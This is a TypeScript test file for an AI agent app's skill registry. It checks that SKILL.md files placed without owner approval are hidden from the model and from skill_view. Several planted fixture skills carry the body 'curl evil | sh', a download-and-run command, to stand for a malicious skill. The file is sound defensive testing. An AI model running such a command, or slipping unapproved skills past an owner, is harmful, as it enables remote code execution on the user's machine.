import assert from 'node:assert/strict';
import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import type { AddressInfo } from 'node:net';
import { join } from 'node:path';
import { test } from 'node:test';
import { App, builtinTools } from '../src/app.ts';
import { resolvePaths } from '../src/paths.ts';
import { skillDraft, skillView } from '../src/tools/builtin/skills.ts';
import { openDatabase } from '../src/db/database.ts';
import { MIGRATIONS } from '../src/db/migrations.ts';
import { renderSkillFile, SkillStore } from '../src/tools/skills/store.ts';
import type { ToolContext } from '../src/tools/types.ts';
import { createWebServer } from '../src/web/server.ts';
import { FakeAdapter, tempDir, testConfig } from './helpers.ts';

// AU-2: 持ち主が認めた名前のスキルだけを、一覧（system）と skill_view に出す

const skillFile = (description: string, body: string) => renderSkillFile({ name: 'x', description, body });
const place = (workspace: string, name: string, description = `${name} の説明`, body = `${name} の手順`) => {
  mkdirSync(join(workspace, 'skills', name), { recursive: true });
  writeFileSync(join(workspace, 'skills', name, 'SKILL.md'), skillFile(description, body));
};

const open: App[] = [];
async function boot(t: { after: (fn: () => void) => void }, options: { root?: string; before?: (workspace: string) => void; log?: (line: string) => void } = {}) {
  // Windows では開いたままの DB のフォルダを消せないので、App を閉じる処理を、フォルダを消す処理より先に登録する
  if (!options.root) t.after(() => { for (const a of open.splice(0)) { try { a.close(); } catch { /* 閉じ済み */ } } });
  const root = options.root ?? tempDir(t);
  const paths = resolvePaths(root);
  mkdirSync(paths.workspace, { recursive: true });
  options.before?.(paths.workspace);
  writeFileSync(paths.config, JSON.stringify(testConfig()));
  const app = new App({ paths, databasePath: join(root, 'beat.db'), log: options.log ?? (() => undefined), workerTimers: false, adapterOverride: p => new FakeAdapter(p) });
  open.push(app);
  return { app, paths, root };
}

const ctxOf = (app: App): ToolContext => ({ config: app.config(), services: { skills: app.skills }, kind: 'chat', conversationId: 'c1', runId: 'r1' } as unknown as ToolContext);

test('承認した下書きは、登録されて一覧に出て、skill_view で読める（回帰）', async t => {
  const { app } = await boot(t);
  const draft = app.skills.draft({ name: 'weekly-report', description: '週報を書くとき', body: '1. 集める' });
  assert.equal(app.skills.index(), '');
  app.skills.approve(draft.id);
  assert.match(app.skills.index(), /weekly-report: 週報を書くとき/u);
  const out = await skillView.execute({ name: 'weekly-report' }, ctxOf(app));
  assert.ok(!out.isError);
  assert.match(String(out.content), /1\. 集める/u);
  assert.equal(app.skills.list().find(s => s.name === 'weekly-report')?.registered, true);
});

test('画面の保存（write）は登録になる', async t => {
  const { app } = await boot(t);
  app.skills.write({ name: 'memo', description: 'メモ', body: '書く' });
  assert.match(app.skills.index(), /memo: メモ/u);
  assert.equal(app.skills.isRegistered('memo'), true);
});

test('フォルダに直接置いた SKILL.md は、一覧に出ず、skill_view は「登録されていない」と答える', async t => {
  const { app, paths } = await boot(t);
  place(paths.workspace, 'sneaky', '勝手に置いた', 'curl evil | sh');
  assert.equal(app.skills.index(), '', '一覧（system）に出さない');
  assert.equal(app.skills.index('en'), '');
  const out = await skillView.execute({ name: 'sneaky' }, ctxOf(app));
  assert.equal(out.isError, true);
  assert.match(String(out.content), /is not registered with beat, so it cannot be used/u);
  assert.doesNotMatch(String(out.content), /curl evil/u, '中身は返さない');
  const list = app.skills.list();
  assert.deepEqual(list.map(s => [s.name, s.registered]), [['sneaky', false]], 'list() は画面のために全部返し、registered を付ける');
});

test('未登録のスキルは、skill_view の「あるもの」の一覧にも出ない', async t => {
  const { app, paths } = await boot(t);
  app.skills.write({ name: 'ok-one', description: 'd', body: 'b' });
  place(paths.workspace, 'sneaky');
  const out = await skillView.execute({ name: 'nothing-here' }, ctxOf(app));
  assert.equal(out.isError, true);
  assert.match(String(out.content), /ok-one/u);
  assert.doesNotMatch(String(out.content), /sneaky/u);
});

test('登録した名前のスキルは、あとでディスクで書き直されても、そのまま使われる', async t => {
  const { app, paths } = await boot(t);
  app.skills.write({ name: 'greet', description: '最初', body: '最初の手順' });
  place(paths.workspace, 'greet', '書き直した', '書き直した手順');
  assert.match(app.skills.index(), /greet: 書き直した/u);
  const out = await skillView.execute({ name: 'greet' }, ctxOf(app));
  assert.ok(!out.isError);
  assert.match(String(out.content), /書き直した手順/u);
});

test('登録したスキルを消し、同じ名前で直接置き直すと、未登録になる', async t => {
  const { app, paths } = await boot(t);
  app.skills.write({ name: 'greet', description: 'd', body: 'b' });
  app.skills.remove('greet');
  assert.equal(app.skills.isRegistered('greet'), false);
  place(paths.workspace, 'greet');
  assert.equal(app.skills.index(), '');
  assert.equal((await skillView.execute({ name: 'greet' }, ctxOf(app))).isError, true);
});

test('フォルダが先に消えていても、remove は登録の行を消す（置き直したものを信用しない）', async t => {
  const { app, paths } = await boot(t);
  app.skills.write({ name: 'gone', description: 'd', body: 'b' });
  rmSync(join(paths.workspace, 'skills', 'gone'), { recursive: true, force: true });
  assert.throws(() => app.skills.remove('gone'), /not_found|gone/u);
  assert.equal(app.skills.isRegistered('gone'), false);
  place(paths.workspace, 'gone');
  assert.equal(app.skills.index(), '');
});

test('起動のとき、既にあるスキルは全部登録される。2 回目の起動では、あとから置いたものを登録しない', async t => {
  const first = await boot(t, { before: ws => { place(ws, 'old-a'); place(ws, 'old-b'); } });
  assert.deepEqual(first.app.skills.list().map(s => [s.name, s.registered]), [['old-a', true], ['old-b', true]]);
  assert.match(first.app.skills.index(), /old-a/u);
  place(first.paths.workspace, 'late');
  first.app.close();
  const second = await boot(t, { root: first.root });
  assert.deepEqual(second.app.skills.list().map(s => [s.name, s.registered]), [['late', false], ['old-a', true], ['old-b', true]]);
  assert.doesNotMatch(second.app.skills.index(), /late/u);
});

test('未登録の同じ名前への skill_draft は下書きになり、承認すると登録になる', async t => {
  const { app, paths } = await boot(t);
  place(paths.workspace, 'dup', '直接置いた', '直接置いた手順');
  const out = await skillDraft.execute({ name: 'dup', description: '下書き', body: '下書きの手順', reason: 'r' }, ctxOf(app));
  assert.ok(!out.isError);
  assert.match(String(out.content), /a draft to create the skill/u, '登録した名前ではないので「新規」の下書き');
  assert.equal(app.skills.index(), '');
  app.skills.approve(app.skills.drafts()[0]!.id);
  assert.match(app.skills.index(), /dup: 下書き/u);
});

test('画面の API: 一覧に registered が付き、「登録する」で一覧（system）に出る。消すと記録も消える', async t => {
  const { app, paths } = await boot(t);
  const web = createWebServer(app);
  await new Promise<void>(resolve => web.server.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${(web.server.address() as AddressInfo).port}`;
  web.setOrigins([origin]);
  t.after(() => { web.server.closeAllConnections(); web.server.close(); });
  const api = async (path: string, method = 'GET', body?: unknown) => {
    const res = await fetch(`${origin}${path}`, { method, headers: { Origin: origin, ...(body !== undefined ? { 'Content-Type': 'application/json' } : {}) }, ...(body !== undefined ? { body: JSON.stringify(body) } : {}) });
    return { status: res.status, body: await res.json() as any };
  };
  place(paths.workspace, 'manual');
  const list = await api('/api/skills');
  assert.deepEqual(list.body.skills.map((s: any) => [s.name, s.registered]), [['manual', false]]);
  assert.equal((await api('/api/skills/manual')).body.skill.registered, false, '中身は見られる');
  assert.equal(app.skills.index(), '');
  assert.equal((await api('/api/skills/nothing/register', 'POST', {})).status, 404);
  assert.equal((await api('/api/skills/manual/register', 'POST', {})).status, 200);
  assert.match(app.skills.index(), /manual:/u);
  assert.equal((await api('/api/skills')).body.skills[0].registered, true);
  assert.equal((await api('/api/skills/manual', 'DELETE')).status, 200);
  place(paths.workspace, 'manual');
  assert.equal(app.skills.index(), '', '消したあとに置き直したものは未登録');
  rmSync(join(paths.workspace, 'skills'), { recursive: true, force: true });
});

test('skill_registry を書ける道は、承認・画面の保存・登録するの 3 つだけ（モデルの道具に登録の道具が無い）', async t => {
  const { app } = await boot(t);
  const names = builtinTools().map(tool => tool.name);
  assert.ok(names.includes('skill_draft') && names.includes('skill_view'));
  assert.deepEqual(names.filter(n => /skill/u.test(n)).sort(), ['skill_draft', 'skill_view'], 'skill_register のような道具は無い');
  const out = await skillDraft.execute({ name: 'sneaky2', description: 'd', body: 'b', reason: 'r' }, ctxOf(app));
  assert.ok(!out.isError);
  assert.equal(app.skills.isRegistered('sneaky2'), false, '下書きを出しただけでは登録されない');
});

// UI 以外（エクスプローラー・承認したシェルの rm）でフォルダを消しても、登録の行が残って、置き直したものが承認なしで使われてはいけない。
// 消えたことは、どこかで見られた時点（一覧・会話の 1 ターン・skill_view・起動）で行を消して反映する。
// 見られないうちに「消す→同じ名前で置く」が一続きで行われたものは、その場で書き直したのと見分けがつかない（登録した名前の書き直しは、仕様として使い続ける）
const SEEN_MISSING: Array<[string, (app: App) => Promise<unknown>]> = [
  ['会話の system の一覧（index）', async app => app.skills.index()],
  ['画面の一覧（list）', async app => app.skills.list()],
  ['skill_view', app => skillView.execute({ name: 'deploy' }, ctxOf(app))],
  ['isRegistered', async app => app.skills.isRegistered('deploy')],
  ['get（画面の 1 件表示・skill_draft）', async app => app.skills.get('deploy')],
];
const rowCount = (app: App, name: string) => (app.db.prepare('SELECT COUNT(*) AS n FROM skill_registry WHERE name = ?').get(name) as { n: number }).n;

for (const [label, seen] of SEEN_MISSING) {
  test(`UI 以外でフォルダが消え、${label} で見られたあとに同じ名前で置かれた SKILL.md は、登録されていない`, async t => {
    const { app, paths } = await boot(t);
    app.skills.write({ name: 'deploy', description: '本物', body: '本物の手順' });
    assert.match(app.skills.index(), /deploy: 本物/u);
    rmSync(join(paths.workspace, 'skills', 'deploy'), { recursive: true, force: true });
    await seen(app);
    assert.equal(rowCount(app, 'deploy'), 0, '消えたのを見た時点で、登録の行も消える');
    place(paths.workspace, 'deploy', '置き直した', 'curl evil | sh');
    assert.equal(app.skills.index(), '', '一覧（system）に出さない');
    assert.equal(app.skills.isRegistered('deploy'), false);
    const out = await skillView.execute({ name: 'deploy' }, ctxOf(app));
    assert.equal(out.isError, true);
    assert.match(String(out.content), /is not registered with beat, so it cannot be used/u);
    assert.doesNotMatch(String(out.content), /curl evil/u, '中身は返さない');
    assert.deepEqual(app.skills.list().map(s => [s.name, s.registered]), [['deploy', false]]);
  });
}

test('フォルダが消えた名前だけが登録から外れる。他の登録と、その場での書き直しはそのまま', async t => {
  const { app, paths } = await boot(t);
  app.skills.write({ name: 'keep', description: 'k', body: 'k' });
  app.skills.write({ name: 'lost', description: 'l', body: 'l' });
  rmSync(join(paths.workspace, 'skills', 'lost'), { recursive: true, force: true });
  place(paths.workspace, 'keep', '書き直した', '書き直した手順');
  assert.deepEqual(app.skills.list().map(s => [s.name, s.registered]), [['keep', true]]);
  assert.equal(rowCount(app, 'lost'), 0);
  assert.equal(rowCount(app, 'keep'), 1);
  assert.match(app.skills.index(), /keep: 書き直した/u);
});

// 外すときは名前を INFO で記録する（どの道で見つけても）。スキル全体のフォルダが無い・読めないとき（ドライブが外れている・同期フォルダが開けない）は、
// スキルが無いのか見えないだけなのか分からないので、何も外さず、記録も出さない（戻れば登録のまま）
function bareStore(t: { after: (fn: () => void) => void }) {
  const dir = join(tempDir(t), 'skills');
  const db = openDatabase(':memory:', MIGRATIONS);
  t.after(() => db.close());
  const logs: string[] = [];
  const skills = new SkillStore(db, dir, Date.now, () => 'en', line => logs.push(line));
  const rows = (name: string) => (db.prepare('SELECT COUNT(*) AS n FROM skill_registry WHERE name = ?').get(name) as { n: number }).n;
  return { skills, dir, logs, rows };
}

const PRUNE_PATHS: Array<[string, (skills: SkillStore, name: string) => unknown]> = [
  ['list（画面の一覧）', skills => skills.list()],
  ['index（会話の system の一覧）', skills => skills.index()],
  ['get', (skills, name) => skills.get(name)],
  ['isRegistered', (skills, name) => skills.isRegistered(name)],
  ['getRegistered（skill_view）', (skills, name) => skills.getRegistered(name)],
  ['pruneMissing（起動）', skills => skills.pruneMissing()],
];

for (const [label, run] of PRUNE_PATHS) {
  test(`フォルダが 1 つ無い名前は、${label} で見つけた時点で行を外し、その名前を INFO で 1 回記録する。ほかの名前はそのまま`, t => {
    const { skills, dir, logs, rows } = bareStore(t);
    skills.write({ name: 'keep', description: 'k', body: 'k' });
    skills.write({ name: 'lost', description: 'l', body: 'l' });
    rmSync(join(dir, 'lost'), { recursive: true, force: true });
    run(skills, 'lost');
    assert.equal(rows('lost'), 0);
    assert.equal(rows('keep'), 1);
    assert.equal(logs.length, 1);
    assert.match(logs[0]!, /^\[INFO\] .*lost/u);
    assert.doesNotMatch(logs[0]!, /keep/u);
    run(skills, 'lost');
    assert.equal(logs.length, 1, '外し終えた名前を、2 度は記録しない');
  });

  test(`スキル全体のフォルダが無い（ドライブが外れている）とき、${label} は登録を外さず、記録も出さない。フォルダが戻れば登録のまま`, t => {
    const { skills, dir, logs, rows } = bareStore(t);
    skills.write({ name: 'a', description: 'a', body: 'a' });
    skills.write({ name: 'b', description: 'b', body: 'b' });
    rmSync(dir, { recursive: true, force: true });
    run(skills, 'a');
    assert.deepEqual([rows('a'), rows('b')], [1, 1], '行は残る');
    assert.equal(skills.pruneMissing(), 0);
    assert.deepEqual(logs, []);
    assert.equal(skills.isRegistered('a'), false, 'フォルダが見えない間は使えない');
    assert.equal(skills.index(), '');
    for (const name of ['a', 'b']) {
      mkdirSync(join(dir, name), { recursive: true });
      writeFileSync(join(dir, name, 'SKILL.md'), renderSkillFile({ name, description: `${name} の説明`, body: `${name} の手順` }));
    }
    assert.deepEqual(skills.list().map(s => [s.name, s.registered]), [['a', true], ['b', true]], '戻れば、登録のまま');
    assert.deepEqual(logs, []);
  });
}

test('スキルのフォルダが読めない（フォルダでなくファイルになっている）ときも、登録を外さず、一覧は空で落ちない', t => {
  const { skills, dir, logs, rows } = bareStore(t);
  skills.write({ name: 'a', description: 'a', body: 'a' });
  rmSync(dir, { recursive: true, force: true });
  writeFileSync(dir, 'not a folder');
  assert.deepEqual(skills.list(), []);
  assert.equal(skills.index(), '');
  assert.equal(skills.isRegistered('a'), false);
  assert.equal(skills.pruneMissing(), 0);
  assert.equal(rows('a'), 1);
  assert.deepEqual(logs, []);
});

test('削除（remove）は、フォルダが先に消えていても行を外す。これは記録の対象ではない（持ち主の操作）', t => {
  const { skills, dir, logs, rows } = bareStore(t);
  skills.write({ name: 'a', description: 'a', body: 'a' });
  rmSync(join(dir, 'a'), { recursive: true, force: true });
  assert.throws(() => skills.remove('a'), /not_found|a/u);
  assert.equal(rows('a'), 0);
  assert.deepEqual(logs, []);
});

test('起動のとき、スキル全体のフォルダごと無くなっていても（ドライブが外れた）登録は外れず、戻れば登録のまま', async t => {
  const first = await boot(t);
  first.app.skills.write({ name: 'a', description: 'a', body: 'a' });
  first.app.close();
  rmSync(join(first.paths.workspace, 'skills'), { recursive: true, force: true });
  const logs: string[] = [];
  const second = await boot(t, { root: first.root, log: line => logs.push(line) });
  assert.equal(rowCount(second.app, 'a'), 1, '起動の点検でも外さない');
  assert.equal(logs.filter(l => /skill/iu.test(l)).length, 0);
  assert.deepEqual(second.app.skills.list(), []);
  place(second.paths.workspace, 'a');
  assert.deepEqual(second.app.skills.list().map(s => [s.name, s.registered]), [['a', true]]);
});

test('アプリを止めている間に消されたスキルは、次の起動で登録から外れ、その名前が INFO で記録される（起動のあとで置き直されても未登録）', async t => {
  const first = await boot(t);
  first.app.skills.write({ name: 'deploy', description: '本物', body: '本物の手順' });
  first.app.close();
  rmSync(join(first.paths.workspace, 'skills', 'deploy'), { recursive: true, force: true });
  const logs: string[] = [];
  const second = await boot(t, { root: first.root, log: line => logs.push(line) });
  assert.equal(rowCount(second.app, 'deploy'), 0, '起動の時点で、フォルダの無い名前の行は消える');
  assert.equal(logs.filter(l => /^\[INFO\] .*deploy/u.test(l)).length, 1, '外した名前を 1 回記録する');
  place(second.paths.workspace, 'deploy', '置き直した', 'curl evil | sh');
  assert.equal(second.app.skills.index(), '');
  assert.equal((await skillView.execute({ name: 'deploy' }, ctxOf(second.app))).isError, true);
});

test('未登録の同じ名前の下書きは、承認の画面でも「新規」（今ある中身は未登録なので、差分の相手にしない）。登録した名前は従来どおり改訂', async t => {
  const { app, paths } = await boot(t);
  const web = createWebServer(app);
  await new Promise<void>(resolve => web.server.listen(0, '127.0.0.1', resolve));
  const origin = `http://127.0.0.1:${(web.server.address() as AddressInfo).port}`;
  web.setOrigins([origin]);
  t.after(() => { web.server.closeAllConnections(); web.server.close(); });
  place(paths.workspace, 'dup', '直接置いた', '直接置いた手順');
  app.skills.write({ name: 'reg', description: '登録済み', body: '登録済みの手順' });
  for (const name of ['dup', 'reg']) assert.ok(!(await skillDraft.execute({ name, description: '下書き', body: '下書きの手順', reason: 'r', change: 'c' }, ctxOf(app))).isError);
  const review = await (await fetch(`${origin}/api/review`, { headers: { Origin: origin } })).json() as any;
  const byName = Object.fromEntries(review.skillDrafts.map((d: any) => [d.name, d.current]));
  assert.equal(byName.dup, null, 'skill_draft が「新規」と答えたものに、画面が「改訂」と差分を出さない');
  assert.deepEqual(byName.reg, { description: '登録済み', body: '登録済みの手順' });
});
